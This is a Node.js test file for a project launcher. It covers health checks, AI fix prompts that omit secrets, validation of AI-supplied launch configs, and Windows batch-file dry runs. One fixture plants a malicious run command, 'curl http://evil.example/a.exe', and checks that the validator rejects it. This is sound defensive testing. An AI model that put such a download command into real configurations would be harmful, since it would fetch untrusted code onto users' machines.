'use strict';
const { test } = require('node:test');
const assert = require('node:assert/strict');
const { execFileSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

process.env.STREAMLINE_DATA = fs.mkdtempSync(path.join(os.tmpdir(), 'sl-health-data-'));
const store = require('../lib/store');
const jobs = require('../lib/jobs');
const health = require('../lib/health');
const launch = require('../lib/launch');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'sl health '));   // a space in the path on purpose
const mk = (name, files) => {
  const dir = path.join(tmp, name);
  for (const [f, c] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true }); fs.writeFileSync(path.join(dir, f), c); }
  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  return { id: name.replace(/\W/g, '').padEnd(8, '0').slice(0, 12), name, localPath: dir, branch: 'main' };
};
const waitJob = async id => { for (let i = 0; i < 400; i++) { const j = jobs.get(id); if (j && j.status !== 'running') return j; await new Promise(r => setTimeout(r, 100)); } throw new Error('job did not finish'); };

const SERVER = "const s=require('http').createServer((q,r)=>r.end('ok')).listen(0,'127.0.0.1',()=>console.log('Ready at http://localhost:'+s.address().port+'/'));";
const projects = [
  mk('Good Server', { 'package.json': JSON.stringify({ name: 'g', scripts: { start: 'node serve.js' } }), 'serve.js': SERVER }),
  mk('Broken Server', { 'package.json': JSON.stringify({ name: 'b', scripts: { start: 'node missing-file.js' } }) }),
  mk('Plain Page', { 'index.html': '<h1>hi</h1>' }),
  mk('Mystery', { 'README.md': 'No idea how this runs.', 'notes.txt': 'x' }),
];
store.saveProjects(projects);
const by = name => projects.find(p => p.name === name);

test('check classifies working, broken, page and undetectable projects', async () => {
  const j = await waitJob(health.startCheck());
  assert.equal(j.status, 'warning');
  const { results, counts } = health.status();
  assert.equal(results[by('Good Server').id].status, 'ok', JSON.stringify(results[by('Good Server').id]));
  const bad = results[by('Broken Server').id];
  assert.equal(bad.status, 'fail');
  assert.match(bad.output.join('\n'), /missing-file/);
  assert.equal(results[by('Plain Page').id].status, 'ok');
  assert.equal(results[by('Mystery').id].status, 'fail');
  assert.equal(results[by('Mystery').id].needsSetup, true);
  assert.deepEqual([counts.ok, counts.fail], [2, 2]);
});

test('the fix prompt covers only failures, with their errors, and leaves secrets out', async () => {
  fs.writeFileSync(path.join(by('Broken Server').localPath, '.env'), 'API_KEY=topsecret999');
  const r = await health.fixPrompt();
  assert.deepEqual(r.projects.sort(), [by('Broken Server').id, by('Mystery').id].sort());
  assert.match(r.prompt, /PROJECT: Broken Server/); assert.match(r.prompt, /missing-file/); assert.match(r.prompt, /PROJECT: Mystery/);
  assert.doesNotMatch(r.prompt, /Good Server|Plain Page|topsecret999/);
  assert.match(r.prompt, /"streamline": 2/);
});

test('a batch reply is validated per project, applied, and the fixed project is re-tested', async () => {
  const cfg = { streamline: 1, kind: 'command', needs: [{ exe: 'node', install: 'winget install OpenJS.NodeJS.LTS' }], setup: [], run: { cmd: 'node serve.js', cwd: '', env: {} }, openUrl: null, notes: 'x' };
  fs.writeFileSync(path.join(by('Broken Server').localPath, 'serve.js'), SERVER);
  const reply = '```json\n' + JSON.stringify({ streamline: 2, projects: {
    'Broken Server': cfg,
    'Mystery': { ...cfg, run: { cmd: 'curl http://evil.example/a.exe', cwd: '', env: {} } },
    'Nonexistent': cfg
  } }) + '\n```';
  const dry = health.applyReply(reply, false);
  const item = n => dry.items.find(i => i.name === n);
  assert.equal(item('Broken Server').ok, true);
  assert.equal(item('Mystery').ok, false); assert.match(item('Mystery').errors[0], /not one of the programs/);
  assert.equal(item('Nonexistent').ok, false);
  assert.equal(dry.saved.length, 0);

  const done = health.applyReply(reply, true);
  assert.deepEqual(done.saved, [by('Broken Server').id]);
  assert.equal(launch.detect(by('Broken Server')).source, 'custom');
  const j = await waitJob(health.startCheck(done.saved));
  assert.ok(['success', 'warning'].includes(j.status));
  const after = health.status().results;
  assert.equal(after[by('Broken Server').id].status, 'ok', JSON.stringify(after[by('Broken Server').id]));
  assert.equal(after[by('Mystery').id].status, 'fail');            // untouched by the bad entry
  assert.equal(health.applyReply('no json here', false).ok, false);
});

test('Windows launcher invocation and dry-run hook are in the generated .bat', () => {
  const bat = launch.renderBat(launch.detect(by('Good Server')));
  assert.match(bat, /if defined STREAMLINE_DRY goto :dry/);
  assert.match(bat, /:dry\r\necho Streamline: setup finished/);
  for (const line of bat.split('\r\n').filter(l => /^\s*echo /.test(l))) assert.doesNotMatch(line.replace(/^\s*echo /, ''), /[&|<>^%()]/, line);
});

test('desktop apps get a dry run: setup runs, but the app is never launched', async () => {
  const p = mk('Desk App', { 'package.json': '{}', 'app.js': "require('fs').writeFileSync('LAUNCHED','1')" });
  store.saveProjects([...store.getProjects(), p]);
  const custom = require('../lib/custom');
  custom.save(p.id, { streamline: 1, kind: 'command', needs: [], setup: [], run: { cmd: 'node app.js', cwd: '', env: {} }, openUrl: '', opensWindow: true, notes: '' });
  const r = await launch.check(p);
  assert.equal(r.status, 'ok', JSON.stringify(r));
  assert.match(r.note, /not launched|Setup finished/);
  assert.equal(fs.existsSync(path.join(p.localPath, 'LAUNCHED')), false);
});

test('interactive command-line tools are not run hidden: check is a dry run, Play opens a console window', async () => {
  const p = mk('Typing Tool', { 'requirements.txt': '', 'tool.py': 'url = input("Paste URL: ")\nprint(url)\n' });
  store.saveProjects([...store.getProjects(), p]);
  const custom = require('../lib/custom');
  custom.save(p.id, { streamline: 1, kind: 'command', needs: [], setup: [], run: { cmd: 'python tool.py', cwd: '', env: {} }, openUrl: '', opensWindow: false, notes: '' });
  assert.equal(launch.detect(p).interactive, true);
  const r = await launch.check(p);
  assert.equal(r.status, 'ok', JSON.stringify(r)); assert.match(r.note, /waits for you to type/);
  const log = path.join(tmp, 'open.log'); process.env.STREAMLINE_OPEN_LOG = log;
  const j = await waitJob(launch.start(p));
  delete process.env.STREAMLINE_OPEN_LOG;
  assert.equal(j.status, 'success'); assert.match(fs.readFileSync(log, 'utf8'), /console:/);
  // a web server that happens to call input() is not treated as interactive
  const w = mk('Web With Input', { 'app.py': 'from flask import Flask\nx = input("q")\n' });
  custom.save(w.id, { streamline: 1, kind: 'command', needs: [], setup: [], run: { cmd: 'python app.py', cwd: '', env: {} }, openUrl: '', opensWindow: false, notes: '' });
  assert.equal(launch.detect(w).interactive, false);
});
